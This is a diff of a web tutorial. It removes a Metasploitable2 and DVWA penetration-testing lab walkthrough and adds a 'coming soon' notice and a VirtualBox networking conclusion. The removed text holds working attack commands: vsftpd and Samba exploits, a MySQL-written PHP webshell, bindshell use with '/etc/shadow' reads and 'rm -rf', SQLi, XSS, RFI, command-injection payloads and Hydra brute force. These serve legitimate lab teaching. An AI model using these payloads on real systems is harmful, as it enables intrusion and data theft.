+                            <li><strong>Difficulty</strong>: Intermediate – Advanced</li>
+                            <li><strong>Prerequisites</strong>: VirtualBox Basics, Kali Linux Setup, NAT Network
+                                Configuration</li>
                         </ul>
-                    </div>
-                    <div class="card-image-output">
-                        <img src="images/host-only-network-configuration-diagram.webp"
-                            alt="host-only network configuration diagram" loading="lazy">
-                    </div>
-                    <h4>Create the Host-Only Network</h4>
-                    <div class="bg-color">
-                        <pre>
-VirtualBox ⟶ File ⟶ Tools ⟶ Network Manager
-(Older versions: File ⟶ Host Network Manager)
-
-Click "Create" (green + icon)
-
-A new network appears: "vboxnet0" (Linux/macOS) or
-                       "VirtualBox Host-Only Ethernet Adapter" (Windows)
-
-Configure it:
-  ┌──────────────────────────────────────────────────┐
-  │ IPv4 Address : 192.168.56.1                      │
-  │ IPv4 Mask    : 255.255.255.0 (/24)               │
-  │ IPv6         : (leave blank)                     │
-  └──────────────────────────────────────────────────┘
-DHCP Server tab:
-  Enable Server
-  Server Address   : 192.168.56.101
-  Server Mask      : 255.255.255.0
-  Lower Address    : 192.168.56.102
-  Upper Address    : 192.168.56.200
-Click "Apply" ⟶ "Close"</pre>
-                    </div>
-
-                    <h4>Attach Both VMs to Host-Only Network</h4>
-                    <p class="sub"><strong class="subtitle">For Kali Linux:</strong></p>
-                    <div class="bg-color">
-                        <pre>
-Select Kali Linux VM ⟶ Settings ⟶ Network
-Adapter 1:
-  Enable Network Adapter
-  Attached to: Host-only Adapter
-  Name: vboxnet0 (Linux/macOS)
-        or "VirtualBox Host-Only Ethernet Adapter" (Windows)
-Click "OK"</pre>
-                    </div>
-                    <p class="sub"><strong class="subtitle">For Metasploitable2:</strong></p>
-                    <div class="bg-color">
-                        <pre>
-Select Metasploitable2 VM ⟶ Settings ⟶ Network
-Adapter 1:
-  Enable Network Adapter
-  Attached to: Host-only Adapter
-  Name: vboxnet0 (same network as Kali)
-Click "OK"</pre>
-                    </div>
-                </div>
-
-                <div class="content">
-                    <h3>Step 5 — Verify Network Connectivity</h3>
-                    <p>Start both VMs and confirm they can see each other.</p>
-                    <h4>Get Metasploitable2's IP</h4>
-                    <div class="bg-color">
-                        <pre>
-Start Metasploitable2 VM ⟶ Wait for login prompt
-Login:
-  Username: msfadmin
-  Password: msfadmin
-Run:
-</pre>
-                    </div>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash"># Inside Metasploitable2
-ifconfig eth0
-# Look for: inet addr: 192.168.56.xxx
-# Note this IP — you will use it throughout the tutorial
-
-hostname -I
-# Simpler alternative</code></pre>
-                    </div>
-                    <h4>Verify from Kali</h4>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash"># Inside Kali Linux terminal
-# First find your own IP
-ip addr show eth0
-# Your Kali IP: 192.168.56.101 (or similar)
-
-# Ping Metasploitable2 (replace with actual IP)
-ping -c 4 192.168.56.102
-
-# Expected output:
-# 64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=0.5 ms
-# 64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=0.4 ms
-# 4 packets transmitted, 4 received, 0% packet loss 
-
-# Confirm NO internet access from Metasploitable2 (isolation check)
-ping -c 2 8.8.8.8
-# Expected: Network is unreachable  (confirms isolation)</code></pre>
-                    </div>
-                    <div class="pro-tips">
-                        <p>If ping succeeds between VMs but fails to internet — your lab is correctly isolated and
-                            ready.</p>
-                    </div>
-                </div>
-
-                <div class="content">
-                    <h3>Step 6 — Reconnaissance: Nmap Port Scan</h3>
-                    <p>Real penetration testing always starts with reconnaissance — discovering what's running on the
-                        target before touching
-                        any exploit.
-                    </p>
-                    <div class="card-image-output">
-                        <img src="images/nmap-scan-attack-workflow.webp" alt="nmap scan attack workflow" loading="lazy">
-                    </div>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash"># ── Basic scan: find open ports ────────────────────────────
-nmap 192.168.56.102
-
-# ── Service version detection (-sV): identifies exact software ─
-nmap -sV 192.168.56.102
-
-# ── Aggressive scan (-A): OS detection + scripts + traceroute ──
-nmap -A 192.168.56.102
-
-# ── Full port scan (all 65535 ports) ───────────────────────
-nmap -p- 192.168.56.102
-
-# ── Save scan results to a file ────────────────────────────
-nmap -sV -oN metasploitable2_scan.txt 192.168.56.102
-cat metasploitable2_scan.txt</code></pre>
-                    </div>
-                    <h4>Expected nmap -sV Output</h4>
-                    <div class="bg-color">
-                        <pre>
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 2.3.4       ←  Backdoor vulnerability
-22/tcp   open  ssh         OpenSSH 4.7p1
-23/tcp   open  telnet      Linux telnetd
-25/tcp   open  smtp        Postfix smtpd
-53/tcp   open  domain      ISC BIND 9.4.2
-80/tcp   open  http        Apache httpd 2.2.8
-139/tcp  open  netbios-ssn Samba 3.x          ←  Another classic exploit
-445/tcp  open  netbios-ssn Samba 3.x
-512/tcp  open  exec        netkit-rsh
-513/tcp  open  login
-514/tcp  open  tcpwrapped
-1099/tcp open  java-rmi    GNU Classpath grmiregistry
-1524/tcp open  bindshell   Metasploitable root shell  ←  Open root shell!
-2049/tcp open  nfs         2-4 (RPC #100003)
-3306/tcp open  mysql       MySQL 5.0.51a       ←  No root password
-5432/tcp open  postgresql  PostgreSQL DB 8.3.0
-6667/tcp open  irc         UnrealIRCd          ←  IRC backdoor
-8009/tcp open  ajp13       Apache Jserv
-8180/tcp open  http        Apache Tomcat/Coyote
-</pre>
-                    </div>
-                    <p>This single scan reveals dozens of known vulnerabilities — exactly what Metasploitable2 is
-                        designed to expose.</p>
-                </div>
-
-                <div class="content">
-                    <h3>Step 7 — First Exploit: vsftpd 2.3.4 Backdoor</h3>
-                    <p>The <code class="code">vsftpd 2.3.4</code> backdoor is the classic first exploit for anyone
-                        learning Metasploit. In 2011, a
-                        malicious backdoor was
-                        inserted into the vsftpd source code — when a username containing <code class="code">:)</code>
-                        is sent to port 21, it
-                        opens a root shell on port
-                        6200.
-                    </p>
-                    <div class="card-image-output">
-                        <img src="images/metasploit-exploitation-diagram.webp" alt="metasploit exploitation diagram"
-                            loading="lazy">
-                    </div>
-                    <h4>Understanding the vulnerability first</h4>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash"># ── Manual exploitation (understand what's happening) ─────
-# The backdoor triggers when you send "USER <anything>:)" to port 21
-# It then opens a root shell listener on port 6200
-
-# Try it manually with netcat (educational — do this first!)
-nc 192.168.56.102 21
-# You see: 220 (vsFTPd 2.3.4)
-
-USER smiley:)
-# Press Enter — this triggers the backdoor
-
-PASS anything
-# Press Enter
-
-# Open another Kali terminal and connect to port 6200
-nc 192.168.56.102 6200
-
-# If successful you see a shell — type:
-id
-# Expected: uid=0(root) gid=0(root) groups=0(root)
-# You have root access!</code></pre>
-                    </div>
-                    <h4>Exploit with Metasploit (the professional way)</h4>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash"># ── Start Metasploit Framework ─────────────────────────────
-sudo msfconsole
-
-# Initialise database (first time only — takes ~60 seconds)
-# You'll see the ASCII art banner + msf6 prompt
-
-# ── Search for vsftpd exploit ──────────────────────────────
-msf6 > search vsftpd
-
-# Expected output:
-# Matching Modules
-# ================
-# # Name Disclosure Date Rank
-# - ---- --------------- ----
-# 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent
-
-# ── Select the exploit module ──────────────────────────────
-msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-
-# ── View required options ──────────────────────────────────
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
-
-# Required Options:
-# RHOSTS — remote host (target IP)
-# RPORT — remote port (default 21)
-
-# ── Set the target IP ──────────────────────────────────────
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
-
-# ── Run the exploit ────────────────────────────────────────
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
-
-# Expected output:
-# [*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
-# [*] 192.168.56.102:21 - USER: 331 Please specify the password.
-# [+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
-# [+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
-# [*] Found shell.
-# [*] Command shell session 1 opened 
-
-# ── You now have a root shell on Metasploitable2! ──────────
-id
-# uid=0(root) gid=0(root) groups=0(root)
-
-uname -a
-# Linux metasploitable 2.6.24 #1 SMP ... i686 GNU/Linux
-
-whoami
-# root
-
-cat /etc/passwd
-# Shows all users on the system
-
-ls /home
-# msfadmin user service ...
-
-# ── Exit the session ───────────────────────────────────────
-exit
-
-# ── List all open sessions ─────────────────────────────────
-msf6 > sessions -l
-
-# ── Interact with a session ────────────────────────────────
-msf6 > sessions -i 1</code></pre>
+                        <p>This tutorial is currently in development and will be published soon on DevspireHub.</p>
                     </div>
                 </div>
                 <hr>
                 <div class="content">
-                    <h3>Step 8 — Bonus Exploits to Practice</h3>
-                    <p>Now that your lab is running, here are 3 more exploits to practice next:</p>
-                    <h4>Exploit 2 — Samba usermap_script (Port 445)</h4>
-                    <p>CVE-2007-2447 | Rank: Excellent</p>
-                    <p><strong>What is Samba?</strong></p>
-                    <p>Samba is a service that lets Linux/Unix machines share files and printers with Windows computers
-                        over the network — just
-                        like Windows file sharing. Port 445 is the SMB (Server Message Block) port it uses.
-                    </p>
-                    <p><strong>What is the Vulnerability?</strong></p>
-                    <p>Samba versions 3.0.20 to 3.0.25rc3 had a flaw in how they handled usernames during login. When a
-                        username was passed to
-                        the system, Samba fed it directly into a shell command without sanitising it first. This means
-                        an attacker could inject
-                        extra shell commands inside the username field and the server would execute them as root.
-                    </p>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash">msf6 > use exploit/multi/samba/usermap_script
-msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.102
-msf6 exploit(multi/samba/usermap_script) > run
-# Result: root shell via SMB — CVE-2007-2447</code></pre>
-                    </div>
-                    <p><strong>Why It Works in One Line</strong></p>
-                    <p>The core flaw is unsanitised input — the username field was never cleaned before being used in a
-                        system call. This is
-                        the same class of bug as SQL injection, just at the OS command level.</p>
-                    <h4>Exploit 3 — MySQL with no root password (Port 3306)</h4>
-                    <p>No CVE needed — it's a misconfiguration</p>
-                    <p><strong>What is the Vulnerability?</strong></p>
-                    <p>MySQL was installed on Metasploitable2 with the root account having no password at all. Any
-                        machine on the network can
-                        log in as database root with zero authentication. This is not a software bug — it is a dangerous
-                        misconfiguration that
-                        is extremely common in real-world poorly maintained servers.
-                    </p>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash"># Direct MySQL login — no password required
-mysql -h 192.168.56.102 -u root
-
-# Inside MySQL:
-SHOW DATABASES;
-# Lists all databases including sensitive ones
-
-SELECT user, password FROM mysql.user;
-# Dumps all MySQL credentials
--- Returns hashed passwords for all MySQL accounts
-
--- Read files from the server filesystem
-LOAD DATA INFILE '/etc/passwd' INTO TABLE test;
-
--- Write a PHP webshell directly to web root
-SELECT "
-<?php system($_GET['cmd']); ?>"
-INTO OUTFILE '/var/www/shell.php';
--- Now visit http://192.168.56.102/shell.php?cmd=id in browser!
-
-EXIT;</code></pre>
-                    </div>
-                    <p class="sub"><strong class="subtitle">Attack Flow</strong></p>
-                    <div class="bg-color">
-                        <pre>
-Kali runs:  mysql -h 192.168.56.102 -u root
-                        ↓
-            MySQL accepts — no password required
-                        ↓
-            Full database admin access
-                        ↓
-            Read all data + write webshell to disk
-                        ↓
-            Webshell = full OS command execution
-</pre>
-                    </div>
-                    <p><strong>Why This Is Critical</strong></p>
-                    <p>A database root account with no password gives an attacker not just all the data — but the
-                        ability to write files to
-                        disk using <code class="code">INTO OUTFILE</code>, which turns a database misconfiguration into
-                        full server compromise.
-                    </p>
-                    <h4>Exploit 4 — Port 1524 — Open Root Bindshell</h4>
-                    <p>No CVE, No exploit tool needed — it's a literal open door</p>
-                    <p><strong>What is a Bindshell?</strong></p>
-                    <p>A bindshell is a program that binds a shell (<code class="code">/bin/bash</code>) to a network
-                        port and waits for anyone to
-                        connect. Whoever
-                        connects gets a command shell — no username, no password, nothing. Metasploitable2 intentionally
-                        runs one on port 1524
-                        to demonstrate this catastrophic misconfiguration.
-
-                    </p>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash"># Port 1524 is a literal open root shell — no exploit needed
-nc 192.168.56.102 1524
-
-# Immediate root shell:
-id
-# uid=0(root) gid=0(root)
-
-whoami
-# root
-
-cat /etc/shadow # read all password hashes
-rm -rf /tmp/* # delete files
-useradd hacker # create new user
-
-# This teaches why open bindshells are critical vulnerabilities</code></pre>
-                    </div>
-                    <p>No Metasploit. No exploit code. No password. Just <code class="code">nc</code>.</p>
-                    <p><strong>Why This Is the Most Dangerous of All Three</strong></p>
-                    <div class="bg-color">
-                        <pre>
-vsftpd backdoor  ⟶ needs :) trigger + port 6200
-Samba exploit    ⟶ needs crafted SMB payload
-MySQL no pass    ⟶ needs mysql client
-
-Port 1524        ⟶ needs only: nc IP 1524
-                   That's it. Anyone. Anytime.
-</pre>
-                    </div>
-                    <p>This is the equivalent of leaving your front door wide open with a sign that says "come in." It
-                        teaches the most
-                        important lesson in security: always audit every open port — not just the well-known ones.
+                    <h2>Conclusion</h2>
+                    <p>Your VirtualBox network is now precisely configured — not just working, but properly understood.
+                        You no longer have to
+                        guess why your VMs can't ping each other or worry that a vulnerable machine is quietly exposed
+                        to your home network.
                     </p>
 
                     <div class="table-container">
-                        <p><strong>Quick Comparison</strong></p>
+                        <h3>What You Mastered in This Tutorial</h3>
+                        <p>You now have a complete, working knowledge of every tool this guide covered:</p>
                         <table>
                             <thead>
                                 <tr>
-                                    <th>Exploit</th>
-                                    <th>Type</th>
-                                    <th>Difficulty</th>
-                                    <th>Root?</th>
-                                    <th>Lesson Taught</th>
+                                    <th>What You Configured</th>
+                                    <th>Result Achieved</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td><strong>Samba usermap_script</strong></td>
-                                    <td>Code injection via unsanitised input</td>
-                                    <td>Easy</td>
-                                    <td>Yes</td>
-                                    <td>Never pass user input to shell unfiltered</td>
+                                    <td><strong>All 6 VirtualBox network modes</strong></td>
+                                    <td>Full understanding of when and why to use each</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>MySQL no root password</strong></td>
-                                    <td>Misconfiguration</td>
-                                    <td>Trivial</td>
-                                    <td>DB root</td>
-                                    <td>Always set strong passwords on every account</td>
+                                    <td><strong>Topology 1 — NAT Network (HackLab)</strong></td>
+                                    <td>Kali ↔ Metasploitable isolated from real LAN</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Port 1524 bindshell</strong></td>
-                                    <td>Open backdoor</td>
-                                    <td>Zero effort</td>
-                                    <td>Full OS root</td>
-                                    <td>Audit every open port — close what isn't needed</td>
+                                    <td><strong>Topology 2 — Internal Network</strong></td>
+                                    <td>Maximum air-gap isolation, static IPs assigned</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Topology 3 — Host-Only + NAT</strong></td>
+                                    <td>SSH into Kali from VS Code / host terminal</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Dual-adapter Kali setup</strong></td>
+                                    <td>Lab attacks on eth0, internet on eth1 simultaneously</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Port forwarding via VBoxManage</strong></td>
+                                    <td>Host browser/terminal access into VM services</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VBoxManage CLI reference</strong></td>
+                                    <td>Entire lab scriptable from command line</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Security checklist</strong></td>
+                                    <td>Metasploitable never exposed to real LAN</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
-                </div>
-
-                <div class="content">
-                    <h3>Step 9 — Add DVWA (Portfolio Extension Target)</h3>
-                    <p><strong>What is DVWA?</strong></p>
-                    <p>Damn Vulnerable Web Application (DVWA) is a deliberately broken PHP web application built for
-                        security students to
-                        practice attacking real web vulnerabilities in a safe, legal environment. It is already
-                        pre-installed on Metasploitable2
-                        — no setup needed.
-                    </p>
-                    <p>Damn Vulnerable Web Application (DVWA) is already installed on Metasploitable2 at port 80. Access
-                        it from Kali's
-                        browser:</p>
-                    <p class="sub"><strong class="subtitle">How to Access</strong></p>
+                    <h4>The One Rule That Solves 90% of Lab Problems</h4>
+                    <p>Every VirtualBox network issue you will ever encounter traces back to this single principle:</p>
                     <div class="bg-color">
                         <pre>
-1. Open Firefox in Kali Linux
-2. Go to → http://192.168.56.102/dvwa
-3. Login:
-   Username: admin
-   Password: password
+Default NAT  =  each VM gets its own isolated router
+               → two VMs on NAT CANNOT talk to each other
+
+NAT Network  =  all VMs share one virtual router
+               → VMs CAN talk to each other + internet on Kali
+
+Internal Network = no DHCP, no internet, no host access
+               → assign static IPs manually for max isolation
 </pre>
                     </div>
-                    <p>First time only — click "Create / Reset Database" on the setup page before logging in.</p>
-                    <h4>DVWA Security Levels</h4>
-                    <p>Before practising, set the difficulty inside DVWA:</p>
-                    <div class="bg-color">
-                        <pre>DVWA → DVWA Security → Set Level</pre>
-                    </div>
-                    <div class="table-container">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Level</th>
-                                    <th>What it means</th>
-                                    <th>Start here?</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td><strong>Low</strong></td>
-                                    <td>Zero protection — raw vulnerable code</td>
-                                    <td>Yes, start here</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Medium</strong></td>
-                                    <td>Basic filtering added — bypass it</td>
-                                    <td>After Low</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>High</strong></td>
-                                    <td>Strong filtering — advanced bypass needed</td>
-                                    <td>After Medium</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Impossible</strong></td>
-                                    <td>Fully secure code — study how defence works</td>
-                                    <td>Last</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                    <p>Always start at Low to understand the attack, then increase difficulty to learn how defences
-                        work.
+                    <p>When your lab breaks, always check this first — wrong mode is the #1 cause of every beginner
+                        connectivity failure.
                     </p>
-                    <h4>Each Vulnerability — Simply Explained</h4>
-                    <div class="list">
-                        <ol>
-                            <li><strong>SQL Injection</strong></li>
-                            <p><strong>What it is:</strong> The login form passes your input directly into a database
-                                query
-                                without checking it. You can manipulate the
-                                query to bypass login or dump all data.
-                            </p>
-                            <p>Try this in the User ID field:</p>
-                            <div id="language-bash" class="code-block">
-                                <div class="title">
-                                    <p>Sql</p>
-                                </div>
-                                <pre>
-<code class="language-bash">1' OR '1'='1</code></pre>
-                            </div>
-                            <p><strong>What happens:</strong> Instead of looking up user ID 1, the database runs:</p>
-                            <div id="language-bash" class="code-block">
-                                <div class="title">
-                                    <p>Sql</p>
-                                </div>
-                                <pre>
-<code class="language-bash">SELECT * FROM users WHERE id='1' OR '1'='1'</code></pre>
-                            </div>
-                            <p>Since <code class="code">'1'='1'</code> is always true, it returns all users in the
-                                database.</p>
-                            <li><strong>XSS — Cross-Site Scripting</strong></li>
-                            <p><strong>What it is:</strong> The web app displays your input back on the page without
-                                sanitising it. You can inject JavaScript that runs in the
-                                victim's browser.
-                            </p>
-                            <p>Reflected XSS — try this in the name field:</p>
-                            <div id="language-bash" class="code-block">
-                                <div class="title">
-                                    <p>xml</p>
-                                </div>
-                                <pre>
-<code class="language-bash">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
-                            </div>
-                            <p><strong>What happens:</strong> The browser executes your script — a popup appears. In
-                                real attacks this
-                                steals session cookies or redirects users to
-                                phishing pages.:</p>
-                            <p>Stored XSS is worse — your script is saved in the database and fires for every user who
-                                views that page.</p>
-                            <li><strong>CSRF — Cross-Site Request Forgery</strong></li>
-                            <p><strong>What it is:</strong> Tricks a logged-in user's browser into making an unwanted
-                                request (like changing their password) by visiting a malicious
-                                page — without the user knowing.
-                            </p>
-                            <p><strong>How it works:</strong></p>
-                            <div class="bg-color">
-                                <pre>
-Victim is logged into DVWA
-         ↓
-Attacker sends victim a link to evil.html
-         ↓
-evil.html silently submits a form to DVWA
-         ↓
-DVWA changes victim's password
-         ↓
-Victim has no idea it happened
-</pre>
-                            </div>
-                            <p>The server trusts the request because it came from the victim's authenticated browser.
-                            </p>
-                            <li><strong>File Inclusion (LFI / RFI)</strong></li>
-                            <p><strong>What it is:</strong> The app loads files based on a URL parameter without
-                                validating it. You can make it load files from the server (LFI) or
-                                from a remote URL (RFI).
-                            </p>
-                            <p class="sub"><strong class="subtitle">LFI — Local File Inclusion:</strong></p>
-                            <div class="bg-color">
-                                <pre>
-http://192.168.56.102/dvwa/vulnerabilities/fi/?page=../../etc/passwd
-</pre>
-                            </div>
-                            <p><strong>What happens:</strong> The server reads <code class="code">/etc/passwd</code> —
-                                exposes all system usernames.</p>
-                            <p class="sub"><strong class="subtitle">RFI — Remote File Inclusion:</strong></p>
-                            <div class="bg-color">
-                                <pre>
-http://192.168.56.102/dvwa/vulnerabilities/fi/?page=http://your-kali-ip/shell.php
-</pre>
-                            </div>
-                            <p><strong>What happens:</strong> The server downloads and executes your PHP file — full
-                                remote code execution.</p>
-
-                            <li><strong>Command Injection</strong></li>
-                            <p><strong>What happens:</strong> The app takes your input and passes it directly to an OS
-                                command (like ping). You can append extra commands using shell
-                                operators.</p>
-                            <div id="language-bash" class="code-block">
-                                <div class="title">
-                                    <p>xml</p>
-                                </div>
-                                <pre>
-<code class="language-bash">127.0.0.1; id
-127.0.0.1; cat /etc/passwd
-127.0.0.1; whoami
-</code></pre>
-                            </div>
-                            <p><strong>What happens:</strong> The server runs:</p>
-                            <div id="language-bash" class="code-block">
-                                <div class="title">
-                                    <p>xml</p>
-                                </div>
-                                <pre>
-<code class="language-bash">ping 127.0.0.1; id
-</code></pre>
-                            </div>
-                            <p>The <code class="code">;</code> separates commands — so <code class="code">id</code> also
-                                runs and its output appears on the page. This is
-                                the same bug class as the Samba
-                                exploit you already ran.</p>
-                            <li><strong>Brute Force Login</strong></li>
-                            <p><strong>What it is:</strong> Automatically trying thousands of username/password
-                                combinations until one works. DVWA's login has no rate limiting or
-                                lockout at Low level.</p>
-                            <p><strong>Using Hydra from Kali:</strong></p>
-                            <div id="language-bash" class="code-block">
-                                <div class="title">
-                                    <p>xml</p>
-                                </div>
-                                <pre>
-<code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-192.168.56.102 http-get-form \
-"/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
-</code></pre>
-                            </div>
-                            <p><strong>What happens:</strong> Hydra sends thousands of login attempts per second until
-                                it finds <code class="code">admin:password</code>.</p>
-                        </ol>
-                    </div>
-                    <div class="table-container">
-                        <h4>DVWA Attack Summary</h4>
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Vulnerability</th>
-                                    <th>Attack Input</th>
-                                    <th>What Attacker Gets</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td><strong>SQL Injection</strong></td>
-                                    <td><code class="code">' OR '1'='1</code></td>
-                                    <td>All database records, bypass login</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>XSS Reflected</strong></td>
-                                    <td><code class="code">&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-                                    <td>JS execution, cookie theft</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>XSS Stored</strong></td>
-                                    <td>Malicious script saved to DB</td>
-                                    <td>Persistent attack on all visitors</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>CSRF</strong></td>
-                                    <td>Hidden form on attacker page</td>
-                                    <td>Change victim's password silently</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>LFI</strong></td>
-                                    <td><code class="code">../../etc/passwd</code> in URL</td>
-                                    <td>Read any server file</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>RFI</strong></td>
-                                    <td>Remote PHP file in URL</td>
-                                    <td>Full remote code execution</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Command Injection</strong></td>
-                                    <td><code class="code">; cat /etc/passwd</code></td>
-                                    <td>Run any OS command</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Brute Force</strong></td>
-                                    <td>Wordlist attack via Hydra</td>
-                                    <td>Crack weak passwords</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                    <h4>Why DVWA Matters for Your Portfolio</h4>
-                    <div class="list">
-                        <p>After completing DVWA you can document each vulnerability in your penetration test report
-                            with:</p>
-                        <ul>
-                            <li>Screenshot of the attack working.</li>
-                            <li>The exact payload used.</li>
-                            <li>CVE or CWE reference.</li>
-                            <li>Remediation recommendation.</li>
-                        </ul>
-                    </div>
-                    <p>This turns your lab practice into real portfolio evidence that demonstrates hands-on web security
-                        skills to employers.</p>
-                </div>
-
-                <div class="content">
-                    <h3>Step 10 — Write Your First Pentest Report</h3>
-                    <p>Every real penetration test ends with a formal report. Practising this separates serious learners
-                        from casual ones — and
-                        makes your portfolio stand out:
+                    <p>Network configuration is invisible when it works and catastrophic when it doesn't. Now you
+                        understand every mode, every
+                        topology, and exactly what
+                        to do when something breaks.
                     </p>
-                    <div class="bg-color">
-                        <pre>
-# Penetration Test Report
-**Target:** Metasploitable2 (192.168.56.102)
-**Tester:** [Your Name]
-**Date:** [Today's Date]
-**Environment:** Isolated VirtualBox lab (Host-Only Network)
-
----
-
-## Executive Summary
-A penetration test was conducted against Metasploitable2, an
-intentionally vulnerable Linux server. Critical vulnerabilities
-were identified and successfully exploited, resulting in full
-root-level access to the target system.
-
----
-
-## Findings
-
-### Finding 1 — vsftpd 2.3.4 Backdoor [CRITICAL]
-- **CVE:** CVE-2011-2523
-- **Port:** 21/TCP (FTP)
-- **CVSS Score:** 10.0 (Critical)
-- **Description:** vsftpd 2.3.4 contains a malicious backdoor
-  that opens a root shell on port 6200 when triggered.
-- **Proof:** Shell session obtained as uid=0(root)
-- **Remediation:** Upgrade vsftpd to 3.0.5 or later.
-  Disable FTP. Use SFTP instead.
-
-### Finding 2 — Samba usermap_script RCE [CRITICAL]
-- **CVE:** CVE-2007-2447
-- **Port:** 445/TCP (SMB)
-- **CVSS Score:** 9.3
-- **Description:** Samba 3.x allows unauthenticated RCE
-  via username shell metacharacter injection.
-- **Remediation:** Upgrade Samba to 4.x. Restrict SMB access.
-
-### Finding 3 — MySQL Unauthenticated Root Access [HIGH]
-- **Port:** 3306/TCP
-- **Description:** MySQL root account has no password set,
-  allowing unauthenticated access to all databases.
-- **Remediation:** Set a strong MySQL root password.
-  Bind MySQL to localhost only (127.0.0.1).
-
----
-
-## Attack Timeline
-09:00 — Reconnaissance (nmap -sV)
-09:15 — vsftpd exploit — root shell obtained
-09:25 — Samba exploit — second root shell
-09:35 — MySQL unauthenticated login confirmed
-
----
-
-## Recommendations (Priority Order)
-1. Upgrade all software from 2008-era versions
-2. Remove bindshell listener on port 1524
-3. Restrict network access to management ports
-4. Implement strong authentication everywhere
-5. Conduct regular vulnerability scanning
-</pre>
-                    </div>
-
-                    <div class="table-container">
-                        <h4>Troubleshooting</h4>
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Problem</th>
-                                    <th>Cause</th>
-                                    <th>Fix</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td><strong>VMs can't ping each other</strong></td>
-                                    <td>Wrong network adapter</td>
-                                    <td>Confirm both VMs use same Host-Only adapter name</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Metasploitable2 boots to (initramfs)</strong></td>
-                                    <td>VMDK not properly attached</td>
-                                    <td>Re-attach VMDK in Settings → Storage</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>msfconsole command not found</strong></td>
-                                    <td>Metasploit not installed</td>
-                                    <td>Run <code class="code">sudo apt install metasploit-framework</code> on Kali</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Exploit runs but no session opened</strong></td>
-                                    <td>Timing issue</td>
-                                    <td>Run exploit again — vsftpd backdoor can be intermittent</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>VirtualBox won't start VMs</strong></td>
-                                    <td>VT-x not enabled</td>
-                                    <td>Enable Intel VT-x / AMD-V in BIOS</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Kali VM very slow</strong></td>
-                                    <td>Not enough RAM</td>
-                                    <td>Increase RAM to 4096 MB in Settings</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>192.168.56.102 not responding</strong></td>
-                                    <td>Metasploitable2 got different IP</td>
-                                    <td>Run <code class="code">ifconfig</code> on Metasploitable2 to get actual IP</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                    <h4>Lab Safety Checklist</h4>
-                    <div class="bg-color">
-                        <pre>
-Before every lab session:
-    ✅ Both VMs set to Host-Only network
-    ✅ Metasploitable2 is NOT connected to NAT or Bridged
-    ✅ You are attacking Metasploitable2 — not any other IP
-    ✅ All activity stays within VirtualBox
-
-After every lab session:
-    ✅ Snapshot both VMs (Machine → Take Snapshot)
-    Lets you restore to clean state instantly
-    ✅ Power off both VMs when not in use
-</pre>
-                    </div>
-
-                    <div class="table-container">
-                        <h4>What to Learn Next</h4>
-                        <table>
-                            <thead>
